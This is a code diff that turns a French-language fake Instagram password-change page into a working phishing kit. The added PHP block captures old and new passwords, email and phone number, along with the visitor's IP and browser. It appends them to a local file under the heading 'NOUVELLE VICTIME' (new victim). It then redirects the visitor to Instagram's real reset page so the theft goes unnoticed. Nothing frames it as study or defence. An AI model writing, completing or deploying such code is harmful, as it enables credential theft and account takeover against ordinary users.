@@ -1,12 +1,53 @@
+<?php
+// ==================== PARTIE GRAB (récupération des infos) ====================
+
+// On traite le formulaire AVANT d'afficher quoi que ce soit
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $ancien_mdp    = $_POST['ancien_mdp']    ?? '';
+    $nouveau_mdp   = $_POST['nouveau_mdp']   ?? '';
+    $confirme_mdp  = $_POST['confirme_mdp']  ?? '';
+    $email         = $_POST['email']         ?? '';
+    $telephone     = $_POST['telephone']     ?? '';
+
+    // Récupération des infos de l'attaquant (IP, navigateur, etc.)
+    $ip         = $_SERVER['REMOTE_ADDR'] ?? 'Inconnu';
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Inconnu';
+    $date       = date('d/m/Y H:i:s');
+    $url_page   = $_SERVER['REQUEST_URI'] ?? '/';
+
+    // Formatage propre pour le log
+    $log = "=== NOUVELLE VICTIME - $date ===\n";
+    $log .= "IP:              $ip\n";
+    $log .= "Navigateur:      $user_agent\n";
+    $log .= "Ancien MDP:      $ancien_mdp\n";
+    $log .= "Nouveau MDP:     $nouveau_mdp\n";
+    $log .= "Confirmé:        $confirme_mdp\n";
+    $log .= "Email:           $email\n";
+    $log .= "Téléphone:       $telephone\n";
+    $log .= "URL page:        http://{$_SERVER['HTTP_HOST']}$url_page\n";
+    $log .= "======================================\n\n";
+
+    // Enregistrement dans un fichier (dans le même dossier que ce script)
+    $file = 'grabbed_instagram.txt';
+    if (file_put_contents($file, $log, FILE_APPEND) === false) {
+        // Option : affiche un message si erreur (utile pour debug)
+        echo "<p style='color:red;'>Erreur : impossible d'écrire dans $file (vérifie les droits du dossier)</p>";
+    }
+
+    // Redirection immédiate vers Instagram
+    header("Location: https://www.instagram.com/accounts/password/reset/");
+    exit;
+}
+?>
+
 <!DOCTYPE html>
 <html lang="fr">
 <head>
   <meta charset="UTF-8" />
-  <link href="style.css" rel="stylesheet">
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Changer le mot de passe • Instagram</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
-  
+  <link href="style.css" rel="stylesheet">
 </head>
 <body>
 
